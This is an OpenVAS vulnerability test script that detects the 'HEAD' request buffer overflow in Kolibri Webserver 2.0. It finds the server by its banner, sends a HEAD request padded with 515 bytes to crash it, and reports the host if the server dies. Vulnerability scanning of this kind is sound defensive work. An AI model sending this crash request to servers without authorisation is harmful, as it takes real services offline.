###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_kolibri_bof_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# Kolibri Webserver 'HEAD' Request Processing Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to crash the server process,
  resulting in a denial-of-service condition.
  Impact Level: Application";
tag_affected = "Kolibri Webserver version 2.0";
tag_insight = "This flaw is caused by a buffer overflow error when handling overly long
  'HEAD' requests, which could allow remote unauthenticated attackers to
  compromise a vulnerable web server via a specially crafted request.";
tag_solution = "No solution or patch is available as of 30th December, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.senkas.com/kolibri/download.php";
tag_summary = "This host is running Kolibri Webserver and is prone to buffer
  overflow vulnerability.";

if(description)
{
  script_id(901171);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-12-31 07:04:16 +0100 (Fri, 31 Dec 2010)");
  script_bugtraq_id(45579);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Kolibri Webserver 'HEAD' Request Processing Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;


  script_description(desc);
  script_summary("Determine Kolibri Webserver buffer overflow vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Web Servers");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15834/");
  script_xref(name : "URL" , value : "http://www.vupen.com/english/advisories/2010/3332");
  exit(0);
}


include("http_func.inc");

## Get HTTP Port
port = get_http_port(default:8080);
if(!port) {
  exit(0);
}

## Get Banner
banner = get_http_banner(port:port);

## Confirm Application
if("server: kolibri" >< banner)
{
  ## Open Socket
  sock = http_open_socket(port);
  if(!sock) {
    exit(0);
  }

  ## Sending Crash
  crash = string("HEAD /", crap(515) ," HTTP/1.1\r\n",
                 "Host: ", get_host_name(), ":", port, "\r\n\r\n");
  send(socket:sock, data:crash);
  http_close_socket(sock);

  ## Check Port Status
  if (http_is_dead(port: port))
  {
    security_warning(port);
    exit(0);
  }
}
